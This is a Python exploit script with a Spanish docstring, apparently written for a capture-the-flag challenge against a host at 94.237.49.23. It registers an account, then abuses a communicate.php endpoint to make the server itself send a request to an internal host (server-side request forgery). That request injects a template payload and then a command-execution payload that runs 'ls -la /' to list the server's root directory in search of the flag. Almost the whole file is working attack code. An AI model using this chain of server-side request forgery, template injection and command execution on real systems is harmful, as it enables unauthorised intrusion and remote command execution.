#!/usr/bin/env python3
"""
El timeout de curl es 1 segundo.

¿Qué pasa si envío múltiples requests rápidamente para causar algún efecto?

O... ¿qué pasa si el timeout de 1 segundo es SUFICIENTE para que una request llegue
a localhost pero NO suficiente para que llegue a un servidor externo?

Entonces si motherland.com ESTÁ configurado en /etc/hosts, la request llegaría.
Pero desde mi perspectiva externa, SIEMPRE veo timeout porque motherland.com no resuelve.

ESA sería la diferencia.

Entonces el SSRF SÍ funcionaría en el servidor, pero yo no puedo verificarlo directamente.

Déjame probar si puedo OBSERVAR efectos secundarios...
"""

import requests
import random
import string
import time

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Crear usuario
session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'normalname', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}")
print(f"[*] Nombre inicial: normalname\n")

# Verificar nombre actual
resp = session.get(f"{TARGET}/")
import re
match = re.search(r'Yo, ([^<]+)</h2>', resp.text)
if match:
    print(f"[*] Nombre en página: {match.group(1)}")

# Intentar SSRF para cambiar nombre
print("\n[*] Enviando SSRF para cambiar nombre...")

payload_name = "{7*7}"  # Payload SSTI simple

data_ssrf = {
    'url': 'http://motherland.com/',
    'data[action]': 'edit',
    'data[new_name]': payload_name
}

resp = session.post(f"{TARGET}/communicate.php", data=data_ssrf, timeout=10)

if "cURL Error" in resp.text and "timed out" in resp.text:
    print("[*] SSRF dio timeout (esperado desde cliente)")
    print("[*] PERO... ¿funcionó en el servidor?")
    
    # Esperar un momento
    time.sleep(1)
    
    # Verificar si el nombre cambió
    print("\n[*] Verificando si el nombre cambió...")
    resp = session.get(f"{TARGET}/")
    match = re.search(r'Yo, ([^<]+)</h2>', resp.text)
    if match:
        current_name = match.group(1)
        print(f"[*] Nombre actual: {current_name}")
        
        if current_name == payload_name:
            print(f"\n[+++] ¡¡¡SUCCESS!!! El nombre cambió a: {payload_name}")
            print(f"[+++] ¡El SSRF FUNCIONA! motherland.com SÍ resuelve en el servidor!")
            print(f"\n[*] Ahora verificando si SSTI se ejecuta...")
            
            if "49" in resp.text:
                print(f"[+++] ¡SSTI EJECUTADO! 7*7=49 encontrado")
                print(f"\n[*] Procediendo a obtener flag...")
                
                # Payload para listar raíz
                payload_ls = "{system('ls -la /')}"
                data_ssrf['data[new_name]'] = payload_ls
                session.post(f"{TARGET}/communicate.php", data=data_ssrf, timeout=10)
                time.sleep(1)
                
                resp = session.get(f"{TARGET}/")
                print(resp.text[:2000])
            else:
                print(f"[-] SSTI no se ejecutó (sin '49' en respuesta)")
                print(f"[*] Contenido de la página:")
                print(resp.text[:1000])
        else:
            print(f"[-] El nombre NO cambió (sigue siendo {current_name})")
            print(f"[-] El SSRF no funcionó")
